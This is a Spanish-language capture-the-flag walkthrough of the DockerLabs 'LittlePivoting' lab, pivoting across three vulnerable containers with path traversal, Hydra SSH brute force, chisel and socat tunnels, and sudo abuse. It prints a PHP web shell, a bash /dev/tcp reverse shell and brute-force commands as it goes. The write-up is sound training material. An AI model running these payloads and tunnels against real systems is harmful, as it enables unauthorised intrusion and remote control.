---
Nombre de la máquina: LittlePivoting
Sistema Operativo: Linux
Dificultad: Media 🟠
Skills: Pivoting, SSH Brute Force, Hydra, Sudoers, Chisel, Socat, Remote Port Forwarding, SUID, Abusing File Upload
Enlace de descarga: https://mega.nz/file/NTNzEI6a#NAaeE_Sfhbg0jT5cGdXL8Cmc-h4v9J37ceihYlBTQXQ
---
---

## Montando el laboratorio

Lo primero que deberemos hacer para practicar con esta máquina es, dirigirnos a la página de [dockerlabs](https://dockerlabs.es/) y descargarnos la máquina desde el [siguiente enlace](https://mega.nz/file/NTNzEI6a#NAaeE_Sfhbg0jT5cGdXL8Cmc-h4v9J37ceihYlBTQXQ). Una vez descargada y descomprimida ejecutaremos el siguiente comando.

```
sudo ./auto_deploy.sh inclusion.tar trust.tar upload.tar
```

Al ejecutar el comando, nos pedirá la contraseña. Al introducirla correctamente, tendremos que esperar hasta que nos indique que la máquina está desplegada.

![Desplegando máquina LittlePivoting](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/778883e7-5890-44fb-b5da-48b33eb74fe1)

Como podemos ver en la imagen anterior, las máquinas están desplegadas correctamente y nos ha creado diferentes interfaces de red con las que operar. Esto nos habrá montado las máquinas vulnerables de *LittlePivoting* a través de *docker*. 

## Como eliminar la máquina vulnerable

En caso de querer eliminarla, simplemente presionaremos en el teclado **CTRL** + **C** y la máquina se eliminará automáticamente.

![Eliminando máquina littlepivoting](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/58bca7e4-ee82-446d-a84c-ac0e925bda31)

En caso de seleccionar *si* a la pregunta que nos hace, se nos eliminarán todas y cada una de las imágenes de *docker*. En caso de que queramos conservar alguna, tendremos que introducir *no*.

## Comprobando la conectividad

Una vez desplegada, deberemos cerciorarnos de que tenemos conectividad con la primera interfaz. En este caso, la única interfaz con la que tenemos conectividad desde nuestra máquina de atacantes es la **10.10.10.2** . Haremos uso del comando `ping` para realizar el chequeo.

![ping primera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/87257073-1df9-4338-a393-c347cc84ff3e)

Comprobamos que tenemos conectividad y, podemos intuir mediante el **TTL** que, el sistema operativo de la máquina víctima es *Linux*.

## Enumeración de la primera máquina

Lo primero que haremos es, escanear en busca de puertos abiertos sobre la IP *10.10.10.2*. Estaremos usando la herramienta `nmap` para facilitarnos esta tarea.

```
sudo nmap -p- --open --min-rate -vvv -sS -Pn -n 10.10.10.2
```

El resultado del comando es el de a continuación.

![primer nmap primera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/c74bd6dd-eea6-4a6a-bbf4-c9e204ca2aa6)

Esta máquina tiene los puertos *22* y *80* abiertos. Para ver más información acerca de ellos, enviaremos una serie de scripts básicos de enumeración de la propia herramienta de `nmap` y detectaremos la versión y servicios que corren en estos puertos.

```
sudo nmap -sCV -p22,80 10.10.10.2
```

Al ejecutar el comando nos sale el siguiente resultado.

![segundo nmap primera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/b9a82630-c468-46cc-825f-f5b6da12a58a)

Observamos que en el puerto *22* está **SSH** y en el *80* el servicio de *Apache2*. Antes de echarle un vistazo a la web, vamos a ejecutar el script *http-enum* con la herramienta `nmap`, por si nos descubre algo interesante.

![tercer nmap primera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/bbfa9371-e566-4e60-82e0-9ce0638effea)

Encontramos que existe un directorio `/shop/` dentro de esta página. Ahora si, vamos a ver el contenido de esta web.

![pagina shop primera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/3dfe3c53-8870-4b2b-85b3-e6ac99310cf9)

## Probando LFI to RCE
Parece una web normal, sin embargo, si bajamos un poco más, veremos lo que parece ser un error del fichero **PHP** que nos da a indicar que existe un parámetro con nombre *archivo*. Podemos intuir por el nombre que se trata de un parámetro que nos muestra el contenido del archivo que le indiquemos.

![error php primera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/2b50ee94-a20b-43d7-bbb3-2c1bb1da168d)

Vamos a probar a listar el fichero `/etc/passwd` haciendo uso de este parámetro.

![probando etc passwd parámetro](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/30023db7-76ae-4760-822c-e902543102f3)

Pero no parece funcionar. Vamos a intentar con un *directory path traversal*.

![directory path traversal](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/b17d2a08-7475-4691-a3ac-aa5410745c91)

De esta manera si que ha funcionado. Lo que podemos hacer ahora es intentar listar algún fichero log como los de la siguiente lista.

```
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```

Sin embargo, ninguno de esta lista nos ha funcionado. Intentando diferentes métodos para derivar el **LFI** a un **RCE** no conseguí encontrar ninguna otra manera así que, parece que no van por aqui los tiros.

## Acceso al sistema (fuerza bruta por SSH)

Algo que podemos hacer es, si miramos el fichero `/etc/passwd` de nuevo, nos encontramos con dos usuarios válidos del sistema.

![usuarios del sistema etc passwd](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/9e5ad696-b468-4ed4-b164-c00df0b00177)

Con estos dos usuarios, intentaremos realizar un ataque de fuerza bruta al servicio de **SSH** utilizando `hydra`.

```
hydra -L users -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2 -t 4
```

Al cabo de un rato, nos encuentra la contraseña del usuario *manchi*.

![contraseña usuario manchi](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/4a57737d-dc00-4524-9362-e74b7ada8bba)

Con estas credenciales, podemos iniciar sesión con este usuario a la máquina víctima.

![inicio de sesion ssh con el usuario manchi](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/a70126f4-578b-4056-a05b-40f9e211da89)

## Descubrimiento de equipos (20.20.20.0/24)

Si miramos las direcciones IP de las interfaces de este equipo, nos encontraremos con otra dirección IP desde la cual no teníamos conectividad desde nuestra máquina de atacantes.

![direcciones ip equipo manchi](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/84e64dff-4c53-445d-8018-1ba02dcf1866)

Viendo que hay otra interfaz de red, vamos a crear un script en bash que se encargue de realizar un reconocimiento de equipos sobre esta interfaz.

```
#!/bin/bash

for host in $(seq 1 254); do
	timeout 1 bash -c "ping -c 1 20.20.20.$host &>/dev/null" && echo "[+] HOST - 20.20.20.$host"
done; wait
```

Seguidamente, le damos permisos de ejecución y lo ejecutamos.

![ejecutando reconocimiento de equipos primera maquina](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/b30c37c9-2e92-4824-a764-67ac3a24a37f)

Encontramos el equipo **20.20.20.3**. Este equipo, si le hacemos un `ping` desde nuestra propia máquina, comprobaremos que no tenemos conectividad.

![comprobando conectividad con la segunda interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/105204aa-e3a8-43f7-adce-288e562718bb)

## Chisel para el acceso a la 20.20.20.0/24

Para poder tener conectividad con esta interfaz, deberemos de usar túneles *socks5* con la herramienta *[chisel](https://github.com/jpillora/chisel)*. Para ello, simplemente nos la descargaremos en nuestra máquina y crearemos el servidor *chisel*.

```
./chisel server --reverse -p 1234
```

Si lo ejecutamos, veremos como se pondrá en escucha por el puerto indicado (en este caso el 1234).

![chisel principal server 1234](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/4c0255c4-a3e8-4118-926f-e56463404977)

Ahora, para conectarnos a este servidor, tendremos que pasar el binario de *chisel* a la máquina, la cual acabamos de obtener acceso y conectarnos a nuestro servidor. Una vez que lo tengamos, le tendremos que dar permisos de ejecución.

![pasando chisel de la máquina víctima a la máquina de manchi](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/bd8d0ff9-0d27-4396-9512-3c791e9d61f2)

Con todo esto, nos conectaremos a nuestro servidor *chisel* con el siguiente comando. A demás le especificaremos que, a través de este túnel, queremos tener acceso a cada uno de los puertos de la máquina víctima.

```
./chisel client 10.10.10.1:1234 R:socks
```

Una vez conectados se nos abrirá el puerto *1080* (por defecto) en nuestro servidor principal. Este puerto se utilizará para el intercambio de comunicaciones entre la máquina *10.10.10.2* con nuestra máquina (*10.10.10.1*).

![conexión cliente chisel a servidor chisel](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/655a5c50-8732-4e2a-9261-53548459143f)

Para podernos comunicar correctamente a través de este túnel, deberemos de editar el fichero de configuración `/etc/proxychains4.conf`. Para ello, al final del fichero añadiremos la siguiente línea.

```
socks5 127.0.0.1:1080
```

De esta manera, le indicaremos que cuando usemos esta herramienta, el túnel se encuentra en el equipo local por el puerto *1080*. A demás, quitaremos el comentario de la directiva *dynamic_chain* y comentaremos la directiva *strict_chain* para evitar problemas.

```
dynamic_chain
#strict_chain
```

## Enumeración de la segunda máquina

Si guardamos los cambios y realizamos un escaneo de los 500 puertos más comunes hacia la máquina **20.20.20.3**, veremos como, ahora si, llegamos hasta ella.

![primer nmap segunda interfaz con proxychains](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/e102a18d-ef23-45a9-a99e-730906d670ad)

En este segunda interfaz, nos encontramos con el puerto *22* y *80* abierto. De nuevo, ejecutaremos el script *http-enum* de `nmap`.

![tercer nmap segunda interfaz con proxychains](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/cbd3930a-28d2-499f-bcb7-f4bbae523ea5)

Parece que no ha encontrado nada, así que vamos a echarle un vistazo a la web. Para poder visualizar la web desde el navegador, tendremos que instalarnos una extensión como *FoxyProxy*. Para configurar un proxy en esta extensión, nos iremos, primeramente a sus opciones.

![opciones foxyproxy](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/74ec712a-46c8-4443-99b8-c38a3f94d081)

En las opciones de la extensión, nos iremos a *Proxies* + *Añadir*.

![opcion añadir proxy](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/93888b0d-7f3d-46e8-a516-de22cfa087a0)

Las opciones del proxy serán las siguientes.

![opciones proxy segunda interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/a23fe83f-bf32-42e0-8edc-380175f94a6e)

Después, guardaremos los cambios y entraremos a la siguiente URL con el proxy, que acabamos de crear, seleccionado.

```
http://20.20.20.3
```

![seleccionando proxy segunda interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/5f383def-442e-4fdd-894e-41e938333ddb)

Al entrar a la web, vemos la página por defecto de *Apache2*.

![pagina principal de apache segunda interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/dca46ed5-7ee0-481a-ab3e-d11b4c7556f1)

Como no vemos mucha información con esta web, haremos uso de `gobuster` para enumerar un poco más en detalle. La herramienta de `gobuster` no permite hacer uso de `proxychains` ya que tiene su propio parámetro `--proxy` para indicarle el proxy correspondiente.

![gobuster proxy segunda interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/42ed5f8b-8a6b-4c8d-b34c-ad6a3e65791c)

El fichero `secret.php` parece interesante.

![secret-php segunda interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/4d9fd0c6-c191-43ea-92b3-f07898fc2c47)

Podemos intuir, que *Mario* es un usuario válido en el sistema, así que intentaremos averiguar su contraseña haciendo uso de `hydra`. Sin embargo, esta herramienta no permite los parámetros `-p` y `-P` usando un proxy, así que realizaremos un *remote port forwarding* para que el puerto *22* de la máquina víctima, sea nuestro puerto *22* y poder realizar el ataque de fuerza bruta hacia nuestro puerto *22*.

## Explotación en la segunda máquina (fuerza bruta por SSH)

Esto será posible, gracias a la herramienta `chisel`, que tendremos que ejecutarlo de la siguiente manera.

```
./chisel client 10.10.10.1:1234 R:22:20.20.20.3:22
```

Al ejecutarlo, debería de conectarse correctamente.

![conectando al servidor chisel para remote port forwarding del puerto 22](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/ec4785ff-18be-4f8d-8ef9-2ca8b5c85d27)

Si volvemos a nuestro servidor principal de *chisel*, veremos que se nos ha abierto otro puerto por el que pasarán estas comunicaciones.

![conexiones servidor chisel principal remote port forwardig](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/1e629ff7-7244-42d4-8c9d-e9bb6adcd061)

Podemos comprobar con el comando `lsof -i:22` que el puerto *22*, en este momento, está ocupado por *chisel*.

![remote port forwarding viendo puerto 22](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/05902216-bb83-41a7-81c4-a5507ebe574f)

En este punto, podemos empezar nuestro ataque de fuerza bruta por **SSH** a través de la *127.0.0.1*.

![credenciales usuario mario segunda interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/f13e692d-b76a-44ae-a399-a73be52a28c3)

## Acceso a la segunda máquina

Al cabo de un rato, nos encuentra la contraseña de este usuario y podríamos conectarnos por **SSH** a la máquina víctima.

```
proxychains ssh mario@20.20.20.3
```

Al conectarnos, nos pedirá la contraseña y nos conectaremos correctamente.

![conexión ssh con mario segunda interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/be0a9e12-47c6-469f-aa91-fd4d2790b3eb)

## Rooteando segunda máquina

Si miramos los permisos que tenemos a nivel de *sudoers* veremos que está el binario `/usr/bin/env`.

![permisos sudoers usuario mario](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/646e37bc-1843-4e0f-8c01-7af4eb340431)

Este binario es totalmente vulnerable con estos privilegios, por lo que ejecutamos el comando de a continuación y lograremos acceso como *root* a esta máquina.

![acceso como root vim](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/f13829da-1b65-4840-977c-144463ebab74)

## Descubrimiento de equipos (30.30.30.0/24)

Una vez rooteada la máquina, veremos las interfaces de red que tiene.

![interfaces de red segunda máquina](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/26c4b876-c6cc-4c5f-9a99-9d9128734e05)

Esta máquina también contiene otra interfaz de red, por lo que podríamos crear el mismo script en bash para el reconocimiento de equipos en la red **30.30.30.0/24**. El problema es que, el comando `ping` no existe.

![comando ping no existe](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/e4377a07-f206-4924-a675-61af8d55de83)

Para poder realizar el escaneo, podemos arreglar un poco el script, aprovechándonos de los descriptores de archivos `/dev/tcp`.

```
#!/bin/bash

for host in $(seq 1 254); do
        timeout 1 bash -c "echo '' > /dev/tcp/30.30.30.$host/80 &>/dev/null" && echo "[+] HOST - 30.30.30.$host"
done; wait
```

Si ejecutamos este código, veremos que hay otra dirección IP disponible en la red.

![descubrimiento tercera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/8bad6d8d-ed1e-4a7d-baf5-a177fdefcd72)

## Montando túneles para el acceso a la 30.30.30.0/24

De nuevo, para poder tener conectividad con la máquina, necesitaríamos que la máquina con la IP **30.30.30.3** se conectara a nuestro servidor *chisel* principal. Para ello, transferiré el binario de *chisel* a la máquina que acabamos de rootear.

![obteniendo chisel en la máquina con la tercera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/e0cf6680-08a4-4e3d-9dc3-f8fc0d88ed32)

Para que la conexión sea posible, tendremos que hacer que desde esta máquina llegue a nuestra máquina, sin embargo, no tenemos conectividad desde la **30.30.30.0/24** a la **10.10.10.0/24** pero, si que tiene conectividad con nosotros la red **20.20.20.0/24**. Por ello, haremos uso de la herramienta *socat* ya que, nos permitirá que, nosotros desde la máquina **30.30.30.2**, nos conectemos con *chisel* a la máquina **20.20.20.2** y la máquina **20.20.20.2** redirija esa conexión a la **10.10.10.1** que somos nosotros.

Primero vamos a descargarnos *socat* desde el [siguiente enlace](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat). Después, lo transferimos a la máquina **20.20.20.2**.

![transfiriendo socat](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/4814bd0b-2259-48c9-a78b-c722c2fea9a3)

Después, desde la máquina **20.20.20.2** transferiremos el binario de *chisel* a la máquina **30.30.30.2**.

![transfiriendo chisel a la tercera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/391ac0e9-f054-4793-872c-2dd7a83196d6)

Con estos binarios ya transferidos, desde la máquina **20.20.20.2**, redirigiremos todas las comunicaciones que nos lleguen a su puerto *1111* por el puerto *1234* de la **10.10.10.1**, es decir a nuestro servidor *chisel* principal. Después, nos conectaremos a esta máquina, desde la **30.30.30.2** indicando cualquier otro puerto que no sea el *1080* (en el servidor principal de *chisel* este puerto ya está en uso, por eso indicaré el puerto *1111* para que se nos conecte a este servidor principal).

![conectando interfaz tres con nuestra máquina redirigiendo con socat](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/ca1b3439-2a4e-4c41-8726-af0ab2b5de0d)

Vemos que se nos ha conectado correctamente, por lo que si nos fijamos en nuestro servidor principal de *chisel*, observaremos que se nos ha abierto otro puerto (el indicando anteriormente) para las comunicaciones entre la **30.30.30.0/24** y la **10.10.10.0/24**.

![chisel principal server puerto 1111](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/0be3cac0-6bde-41e5-9d86-979cd3f901a6)

## Enumeración de la tercera máquina

En este momento, si realizamos un escaneo en busca de los puertos abiertos de la máquina *30.30.30.2*, veremos que podemos llegar hasta ella.

![primer nmap tercera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/e7fb06bf-6546-442d-8d39-4d23a58927b3)

Seguidamente, lanzaremos unos scripts de enumeración y detectaremos la versión y servicios para estos puertos abiertos.

![segundo nmap tercera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/a1694ab0-92fa-41cd-b127-cbe5b272d2d6)

Vamos a ver lo que hay en la web. Como anteriormente hicimos, tendremos que crear un nuevo proxy en *FoxyProxy*. Esta vez, las opciones son las siguientes.

![proxy foxyproxy tercera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/e9ca072c-ab34-4066-9175-ffda98730709)

Con esto configurado y seleccionado en la lista de proxies, accederemos a la URL `http://30.30.30.3`.

![página principal tercera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/34ca5ce7-ff93-43cd-9230-083cca46e626)

Parece ser que podemos subir un fichero, sin embargo no sabemos donde se sube. Vamos a probar si subiendo cualquier imagen nos dice donde se ha subido.

![subiendo imagen](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/7a296ebf-4c49-4526-b045-5da20a2417f9)

No parece decirnos nada, vamos a probar a fuzzear con `gobuster`.

![fuzzing gobuster tercera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/4df8cd09-ea4c-41bf-826e-7256a2704ba7)

Hemos encontrado este directorio donde puede que se suban los ficheros. Si nos dirigimos a él, encontramos que efectivamente es el directorio de subida de ficheros.

![directorio de uploads](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/3f40a173-0166-42ae-8627-eca5c1d973f1)

## Explotación de la tercera máquina (Abusing File Upload - RCE)

Viendo que la página interpreta **PHP**, probaré a subir un fichero con código PHP malicioso.

```
<?php system($_GET['cmd']); ?>
```

Comprobamos que nos deja subir el fichero y que no hay ningún tipo de restricción.

![subiendo fichero pwned con código php malicioso](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/51d42d1c-fc1e-4947-ba9d-2ba7dfd8f123)

En este punto, solo nos queda meternos en el fichero PHP que acabamos de subir dentro del directorio `/uploads` y probaremos a ejecutar un comando cualquiera como `whoami`.

![ejecutando comando whoami](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/feb2031b-9dd6-4444-aed8-f5388db748cb)

Al poder ejecutar comandos remotamente, vamos a enviarnos una *reverse shell*. Para poder llegar a nuestra máquina de atacantes, deberemos de utilizar *socat* de nuevo. En primer lugar, la *reverse shell* la enviaremos hacia la **30.30.30.2** por el puerto *443*. La **20.20.20.3**, redirigirá las conexiones que le vengan por el puerto *443* hacia la **20.20.20.2** por el puerto *442*. Por último, esta redirigirá las conexiones que le vengan por el puerto *442* hacia la **10.10.10.1** por su puerto 441.

Lo primero que tenemos que hacer es, pasarnos el binario del *socat* a la **20.20.20.3**.

![transfiriendo socat a la tercera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/7ad7e652-7ace-4740-9ed0-06ba998a30b5)

Ahora, redirigiremos las comunicaciones con *socat*.

![redirigiendo conexiones con socat](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/7d1f1c67-7edd-4945-816c-4bd6e1883c75)

## Acceso a la tercera máquina

Con esto montado, nos pondremos en escucha por el puerto *441*.

![en escucha por el puerto 441](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/eee9cfc1-36ae-454e-8145-536c255af8d8)

Por último enviaremos una *reverse shell* a la **30.30.30.2** por el puerto *443*.

```
bash -c "bash -i >%26/dev/tcp/30.30.30.2/443 0>%261"
```

Y al ejecutar la petición con la *reverse shell*, veremos como nos hemos podido conectar a la máquina víctima.

![obteniendo shell desde la última máquina](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/f1ae5f30-ef07-4c5c-b142-c620c9e65c90)

Dentro de la máquina víctima, buscaremos por binarios *SUID*.

![binarios suid máquina tercera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/629b2d35-b731-43c0-8d4d-badd97c2a1a8)

## Rooteando la tercera máquina

Al no encontrar nada, vamos a ver los permisos que tenemos a nivel de *sudoers*.

![permisos a nivel de sudoers tercera interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/85f133b4-947c-435e-a392-343a06df7897)

Con este binario, nos podemos aprovechar para escalar privilegios y tener acceso como *root* de la siguiente manera.

![escalando privilegios máquina tercerca interfaz](https://github.com/h3g0c1v/DockerLabs-Machine-Write-Ups/assets/66705453/9d562bf2-10c7-4c8e-a31c-e229fd148094)

De esta manera, hemos podido llegar al final de este laboratorio.
